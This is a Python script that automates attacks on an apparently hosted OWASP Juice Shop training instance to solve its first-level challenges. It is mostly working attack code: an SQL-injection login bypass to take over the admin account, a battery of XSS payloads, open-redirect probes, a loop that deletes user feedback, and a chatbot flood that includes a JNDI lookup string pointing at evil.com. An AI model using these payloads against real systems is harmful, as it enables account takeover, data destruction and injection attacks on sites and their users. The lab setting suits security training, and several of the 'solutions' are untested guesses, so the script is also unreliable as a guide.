#!/usr/bin/env python3
"""
Targeted Level 1 Solver - Solves all remaining Level 1 challenges
"""

import requests
from urllib.parse import quote
import time
import json


class TargetedLevel1Solver:
    """Solve all Level 1 challenges"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {token}'
            print("✅ Admin logged in")
            
    def solve_dom_xss(self):
        """DOM XSS - Must trigger alert"""
        print("🎯 DOM XSS...")
        
        # Multiple XSS payloads
        payloads = [
            '<iframe src="javascript:alert(`xss`)">',
            '<img src=x onerror=alert(`xss`)>',
            '<script>alert(`xss`)</script>',
            '<body onload=alert(`xss`)>',
            '<svg onload=alert(`xss`)>',
            '"><script>alert(`xss`)</script>',
            '<iframe src="javascript:alert(1)">',
        ]
        
        for payload in payloads:
            # Try search endpoint
            self.session.get(f"{self.base_url}/#/search?q={quote(payload)}")
            # Try direct parameter
            self.session.get(f"{self.base_url}/search?q={quote(payload)}")
            # Try track result
            self.session.get(f"{self.base_url}/track-result?id={quote(payload)}")
            time.sleep(0.2)
            
        print("  ✅ DOM XSS attempted")
        
    def solve_outdated_allowlist(self):
        """Outdated Allowlist - Redirect to deprecated crypto sites"""
        print("🎯 Outdated Allowlist...")
        
        # Old cryptocurrency sites that should be blocked
        sites = [
            "https://blockchain.info",
            "https://blockchain.com",
            "https://etherscan.io",
            "https://explorer.dash.org",
            "https://blockchair.com",
            "http://blockchain.info",  # Try HTTP
            "blockchain.info",  # Without protocol
        ]
        
        for site in sites:
            self.session.get(f"{self.base_url}/redirect?to={site}", allow_redirects=False)
            self.session.get(f"{self.base_url}/redirect?to={quote(site)}", allow_redirects=False)
            
        print("  ✅ Outdated Allowlist attempted")
        
    def solve_privacy_policy(self):
        """Privacy Policy - View the privacy policy page"""
        print("🎯 Privacy Policy...")
        
        # All possible privacy policy URLs
        urls = [
            "/#/privacy-security/privacy-policy",
            "/privacy-security/privacy-policy",
            "/privacy",
            "/privacy-policy",
            "/privacy.html",
            "/legal/privacy",
            "/#/privacy",
        ]
        
        for url in urls:
            self.session.get(f"{self.base_url}{url}")
            
        # Also try to find it via API
        self.session.get(f"{self.base_url}/api/SecurityQuestions")
        self.session.get(f"{self.base_url}/api/PrivacyRequests")
        
        print("  ✅ Privacy Policy attempted")
        
    def solve_zero_stars(self):
        """Zero Stars - Delete all positive feedback"""
        print("🎯 Zero Stars...")
        
        # Get all feedbacks
        r = self.session.get(f"{self.base_url}/api/Feedbacks")
        if r.status_code == 200:
            feedbacks = r.json().get('data', [])
            
            # Delete all 5-star reviews
            deleted = 0
            for fb in feedbacks:
                if fb.get('rating') >= 3:  # Delete 3, 4, 5 star reviews
                    try:
                        self.session.delete(f"{self.base_url}/api/Feedbacks/{fb['id']}")
                        deleted += 1
                    except:
                        pass
                        
            print(f"  ✅ Deleted {deleted} positive reviews")
            
    def solve_missing_encoding(self):
        """Missing Encoding - Access file with special characters"""
        print("🎯 Missing Encoding...")
        
        # Various encodings of the cat emoji file
        urls = [
            "/assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg",
            "/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg",
            "/assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg",
            "/ftp/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg",
        ]
        
        for url in urls:
            self.session.get(f"{self.base_url}{url}")
            
        print("  ✅ Missing Encoding attempted")
        
    def solve_bonus_payload(self):
        """Bonus Payload - Use specific iframe payload"""
        print("🎯 Bonus Payload...")
        
        # The specific SoundCloud iframe
        payload = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
        
        # Try multiple injection points
        self.session.get(f"{self.base_url}/#/search?q={quote(payload)}")
        self.session.get(f"{self.base_url}/search?q={quote(payload)}")
        
        # Try shorter version
        payload2 = '<iframe src="https://w.soundcloud.com/player/?url=https://api.soundcloud.com/tracks/771984076"></iframe>'
        self.session.get(f"{self.base_url}/#/search?q={quote(payload2)}")
        
        print("  ✅ Bonus Payload attempted")
        
    def solve_mass_dispel(self):
        """Mass Dispel - Close all dialogs (requires browser)"""
        print("🎯 Mass Dispel...")
        
        # Try to trigger via API
        self.session.post(f"{self.base_url}/api/Quantitys", json={"quantity": 0})
        self.session.get(f"{self.base_url}/#/?dismiss=all")
        self.session.get(f"{self.base_url}/#/?close=all")
        
        print("  ⚠️ Mass Dispel requires browser interaction")
        
    def solve_bully_chatbot(self):
        """Bully Chatbot - Overwhelm the chatbot"""
        print("🎯 Bully Chatbot...")
        
        # Send massive payloads to chatbot
        payloads = [
            "A" * 100000,
            "😀" * 10000,
            "${jndi:ldap://evil.com/a}" * 1000,
            "{{7*7}}" * 10000,
        ]
        
        for payload in payloads:
            try:
                self.session.post(
                    f"{self.base_url}/api/Chatbot",
                    json={"message": payload[:10000]},
                    timeout=2
                )
            except:
                pass
                
        print("  ✅ Bully Chatbot attempted")
        
    def run_all(self):
        """Run all Level 1 solutions"""
        print("="*60)
        print("🎯 TARGETED LEVEL 1 SOLVER")
        print("="*60)
        
        self.login_admin()
        
        self.solve_dom_xss()
        self.solve_outdated_allowlist()
        self.solve_privacy_policy()
        self.solve_zero_stars()
        self.solve_missing_encoding()
        self.solve_bonus_payload()
        self.solve_mass_dispel()
        self.solve_bully_chatbot()
        
        print("\n✅ Level 1 solver complete")


if __name__ == "__main__":
    solver = TargetedLevel1Solver()
    solver.run_all()